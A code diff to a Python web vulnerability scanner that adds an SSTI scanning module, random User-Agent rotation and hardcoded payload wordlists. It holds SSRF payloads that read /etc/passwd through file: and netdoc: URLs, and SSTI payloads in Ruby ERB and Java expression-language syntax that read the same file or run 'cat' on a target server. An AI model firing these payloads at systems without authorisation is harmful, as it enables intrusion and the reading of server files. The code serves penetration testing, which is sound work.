@@ -13,8 +13,22 @@ import random
 from scanners.scan_idor import idor
 from scanners.scan_lfi import lfi
 from scanners.scan_ssrf import ssrf
+from scanners.scan_ssti import ssti
+import random
 
+user_agents = [
+ "Mozilla/5.0 (X11; U; Linux i686; it-IT; rv:1.9.0.2) Gecko/2008092313 Ubuntu/9.25 (jaunty) Firefox/3.8",
+ "Mozilla/5.0 (X11; Linux i686; rv:2.0b3pre) Gecko/20100731 Firefox/4.0b3pre",
+ "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-GB; rv:1.8.1.6)",
+ "Mozilla/5.0 (Macintosh; U; Intel Mac OS X; en)",
+ "Mozilla/3.01 (Macintosh; PPC)",
+ "Mozilla/4.0 (compatible; MSIE 5.5; Windows NT 5.9)",  
+ "Mozilla/5.0 (X11; U; Linux 2.4.2-2 i586; en-US; m18) Gecko/20010131 Netscape6/6.01",  
+ "Opera/8.00 (Windows NT 5.1; U; en)",  
+ "Mozilla/5.0 (Windows; U; Windows NT 5.1; en-US) AppleWebKit/525.19 (KHTML, like Gecko) Chrome/0.2.153.1 Safari/525.19"
+]
 
+user_agent = random.choice (user_agents)
 
 #Stuff related to Mechanize browser module
 br = mechanize.Browser() #Shortening the call by assigning it to a varaible "br"
@@ -30,10 +44,10 @@ br.set_debug_http(False)
 br.set_debug_responses(False)
 br.set_debug_redirects(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(), max_time = 1)
-br.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
+br.addheaders = [('User-Agent', user_agent),
 ('Accept','text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'), ('Accept-Encoding','br')]
 
-def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):   
+def all_list(l,c,cl,h,x,lf,s,i,sr,sst,output,fname,o,vulnerables_urls):   
      
  for linea in l:
 
@@ -53,12 +67,16 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):
          try:
              br.open(linea, timeout=10.0) #Opens the url
          except URLError as e:
-             linea = 'https://' + linea
-             br.open(linea)    
+             for line in linea:
+                 linea = linea.replace('http://', 'https://')
+             try:    
+                 br.open(linea)
+             except:
+                 print('[?] open Url Error')     
          #forms = br.forms() #Finds all the forms present in webpage
- 
+         
          headers = str(urlopen(linea).headers).lower()
-
+         
          if h:
                 if 'strict-transport-security' not in headers:
                     print ('\033[1;32m[+]\033[0m ' + linea + ' \033[1;32mNot force HSTS\033[0m')
@@ -106,8 +124,7 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):
                              continue
                          uri.append(v)            
                  print()        
-                 print('\033[1;33mTest xss for default payload:\033[0m')
-                 print()        
+                 print('\033[1;33mTest xss for default payload:\033[0m')       
                  xss(uri,wordlist,vulnerables_urls)           
              except: 
                   continue
@@ -156,7 +173,7 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):
      try:    
          if sr:
              uri=[]
-             wordlist=['']   
+             wordlist=['file:///etc/passwd','file://\/\/etc/passwd','netdoc:///etc/passwd']   
              try:
                  parametizer(linea,output)
                  with open(output, "r") as f:
@@ -166,7 +183,7 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):
                              continue
                          uri.append(w)            
                  print()        
-                 print('\033[1;33mSearch SSRF parameters:\033[0m')
+                 print('\033[1;33mTest SSRF for default payloads:\033[0m')
                  print()        
                  ssrf(uri,wordlist,vulnerables_urls)           
              except: 
@@ -192,7 +209,27 @@ def all_list(l,c,cl,h,x,lf,s,i,sr,output,fname,o,vulnerables_urls):
              except: 
                   continue
      except:
-         continue          
+         continue
+     try:    
+         if sst:
+             uri=[]
+             wordlist=["<%= File.open('/etc/passwd').read %>","${T(java.lang.Runtime).getRuntime().exec('cat etc/passwd')}"]   
+             try:
+                 parametizer(linea,output)
+                 with open(output, "r") as f:
+                     for k in f.readlines():
+                         k = k.strip()
+                         if k == "" or k.startswith("#"):
+                             continue
+                         uri.append(k)            
+                 print()        
+                 print('\033[1;33mTest ssti for default payloads:\033[0m')
+                 print()        
+                 ssti(uri,wordlist,vulnerables_urls)           
+             except: 
+                  continue
+     except:
+         continue                    
      if o:
          save_output(vulnerables_urls,fname,linea)    
          
